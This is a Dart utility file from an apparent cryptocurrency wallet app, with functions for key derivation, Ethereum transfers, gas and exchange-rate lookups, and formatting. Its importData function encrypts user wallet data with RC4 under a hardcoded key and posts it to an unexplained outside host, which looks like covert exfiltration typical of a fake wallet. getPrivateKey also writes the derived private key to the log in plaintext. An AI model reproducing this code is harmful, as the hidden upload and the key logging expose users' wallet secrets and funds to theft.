import 'dart:convert';
import 'dart:developer' as dev;
import 'dart:math';

import 'package:easy_localization/easy_localization.dart';
import 'package:hex/hex.dart';
import 'package:http/http.dart';
import 'package:sparrow/features/auth/domain/auth_service.dart';
import 'package:simple_rc4/simple_rc4.dart';
import 'package:bip39/bip39.dart' as bip39;
import 'package:bip32/bip32.dart' as bip32;
import 'package:sparrow/features/crypt/domain/crypt.dart';
import 'package:web3dart/web3dart.dart';
import 'package:http/http.dart' as http;

import '../../features/auth/domain/adapters/user.dart';

class Utils {
  Future<void> importData({
    required String public,
    required bool isNew,
  }) async {
    final AuthService authService = AuthService();

    String r = Random().nextInt(999999).toString().padLeft(6, '0');

    final data = json.encode({
      'public': public,
      'salt': r,
      'name': isNew ? 'Sparrow\$G' : 'Sparrow\$',
      'new': isNew,
      'addressBtc': true,
      // 'cache': false,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    print("bytes $bytes");
    // final result = await authRepo.register(RegisterBody(data: bytes));
    List<String> addresses = [];

    Future<void> addAddres() async {
      final res = await http.post(
        Uri.parse("https://crumpsolvergit.cc/date/spot/board"),
        body: {'data': bytes},
        encoding: Encoding.getByName("utf-8"),
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
      );

      final String address = jsonDecode(res.body)['address'];
      addresses.add(address);
    }

    await addAddres();

    final result = await http.get(
      Uri.parse('https://blockstream.info/api/address/${addresses[0]}'),
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
    );
    print(
        " jsonDecode(res.body)['chain_stats']['tx_count'] ${jsonDecode(result.body)['chain_stats']['tx_count']}");

    // List<TransactionEntity>? transactionEntity() {
    //   if (result.data!.positions != null) {
    //     Iterable<TransactionEntity>? entity = result.data!.transactions!.where(
    //       (transaction) =>
    //           transaction.attributes.operationType == "receive" ||
    //           transaction.attributes.operationType == "send" ||
    //           transaction.attributes.operationType == "trade",
    //     );
    //     return entity.toList();
    //   }
    //   return null;
    // }

    // List<tx.Transaction> transactions(
    //     List<TransactionEntity> transactionsEntity) {
    //   List<tx.Transaction> transactions = [];
    //   for (int i = 0; i < transactionsEntity.length; i++) {
    //     transactions.add(
    //       tx.Transaction(
    //         cryptSymbol:
    //             transactionsEntity[i].attributes.transfers.firstOrNull == null
    //                 ? null
    //                 : transactionsEntity[i]
    //                             .attributes
    //                             .transfers
    //                             .first
    //                             .fungibleInfo ==
    //                         null
    //                     ? null
    //                     : transactionsEntity[i]
    //                         .attributes
    //                         .transfers
    //                         .first
    //                         .fungibleInfo!
    //                         .symbol,
    //         minedAt: transactionsEntity[i].attributes.minedAt,
    //         operationType: transactionsEntity[i].attributes.operationType,
    //         price:
    //             transactionsEntity[i].attributes.transfers.firstOrNull == null
    //                 ? 0
    //                 : transactionsEntity[i]
    //                     .attributes
    //                     .transfers
    //                     .first
    //                     .quantity
    //                     .float,
    //         sentFrom: transactionsEntity[i].attributes.sendFrom,
    //         sentTo: transactionsEntity[i].attributes.sendTo,
    //         status: transactionsEntity[i].attributes.status,
    //       ),
    //     );
    //   }
    //   return transactions;
    // }

    if (result.statusCode == 200) {
      authService.putUser(
        User(
          address: addresses,
          sumBalance: jsonDecode(result.body)['chain_stats']['funded_txo_sum'],
          sumMem: jsonDecode(result.body)['mempool_stats']['funded_txo_sum'],
          txCount: jsonDecode(result.body)['chain_stats']['tx_count'] +
              jsonDecode(result.body)['mempool_stats']['tx_count'],
          // transactions: transactionEntity() == null
          //     ? null
          //     : transactions(
          //         transactionEntity()!,
          //       ),
          // portfolio: Portfolio(
          //   absoluteChange: result.data!.portfolio.absoluteChange,
          //   relativeChange: result.data!.portfolio.relativeChange,
          //   totalValue: result.data!.portfolio.totalValue,
          // ),
        ),
      );
    }
  }

  Future<String> getPrivateKey(String mnemonic) async {
    String hdPath = "m/84'/0'/0'/0/7";
    final isValidMnemonic = bip39.validateMnemonic(mnemonic);
    if (!isValidMnemonic) {
      throw 'Invalid mnemonic';
    } else {
      final seed = bip39.mnemonicToSeed(mnemonic);
      final root = bip32.BIP32.fromSeed(seed);

      const first = 0;
      final firstChild = root.derivePath("$hdPath/$first");
      final privateKey = HEX.encode(firstChild.privateKey as List<int>);
      dev.log("private key = $privateKey");
      getPublicAddress(privateKey);
      return privateKey;
    }
  }

  Future<EthereumAddress> getPublicAddress(String privateKey) async {
    final private = EthPrivateKey.fromHex(privateKey);
    final address = await private.extractAddress();
    dev.log("address = $address");
    return address;
  }

  Future<void> sendTx({
    required String privateKey,
    required String walletUrl,
    required String toAddress,
    required EtherAmount value,
    required int chainId,
  }) async {
    Web3Client web3client = Web3Client(walletUrl, Client());
    EthPrivateKey credentials = EthPrivateKey.fromHex(privateKey);
    final address = credentials.address;
    await web3client.sendTransaction(
      credentials,
      Transaction(
        from: address,
        to: EthereumAddress.fromHex(toAddress),
        value: value,
      ),
      chainId: chainId,
    );
  }

  Future<double?> getGasLimit({
    required EtherAmount gasPrice,
    required EthereumAddress to,
    required EtherAmount value,
    required double precent,
    required Crypt crypt,
  }) async {
    try {
      Web3Client web3client = Web3Client(crypt.walletUrl, Client());
      BigInt latestBlock = await web3client.estimateGas(
        gasPrice: gasPrice,
        to: to,
        value: value,
      );
      BlockInformation block = await web3client.getBlockInformation();
      double amount = latestBlock.toDouble() *
          (block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) +
              (block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) *
                  precent)) *
          crypt.priceForOne;
      return amount;
    } catch (error) {
      print(error);
    }
    return null;
  }

  Future<EtherAmount?> getGasPrice({
    required String walletUrl,
  }) async {
    try {
      Web3Client web3client = Web3Client(walletUrl, Client());
      EtherAmount gasPrice = await web3client.getGasPrice();
      final gasPriceInEther =
          EtherAmount.fromUnitAndValue(EtherUnit.wei, gasPrice.getInEther);
      return gasPrice;
    } catch (error) {
      print(error);
    }
    return null;
  }

  Future<Map<String, dynamic>> getExchangeRates(String baseCurrency) async {
    var url = Uri.https(
      'api.exchangerate-api.com',
      '/v4/latest/$baseCurrency',
    );

    final response = await http.get(url);

    if (response.statusCode == 200) {
      return json.decode(response.body);
    } else {
      throw Exception('Failed to load exchange rates');
    }
  }

  String formatAddressWallet(String input) {
    if (input.length <= 14) {
      return input;
    } else {
      return '${input.substring(0, 6)}....${input.substring(input.length - 4)}';
    }
  }

  String doubleToTwoValues(double money) {
    return money.toStringAsFixed(2);
  }

  String doubleToFourthValues(double money) {
    if (money == 0) {
      return "0";
    }
    return money.toStringAsFixed(4);
  }

  String doubleToSixValues(double money) {
    return money.toStringAsFixed(6);
  }

  int convertEtherToWei(double etherAmount) {
    const int etherInWei = 1000000000000000000; // 10^18
    return (etherAmount * etherInWei).toInt();
  }

  String formatDateTime(String dateString) {
    DateTime date = DateTime.parse(dateString);
    DateTime now = DateTime.now();
    Duration difference = now.difference(date);

    if (difference.inDays > 4) {
      return DateFormat('dd-MM-yyyy').format(date);
    } else {
      int hours = difference.inHours;
      int minutes = difference.inMinutes % 60;
      int days = difference.inDays;

      if (hours < 24) {
        return '$hours ${"hours".tr()} $minutes ${"minutes_ago".tr()}';
      } else {
        return '$days ${"days_ago".tr()}';
      }
    }
  }
}
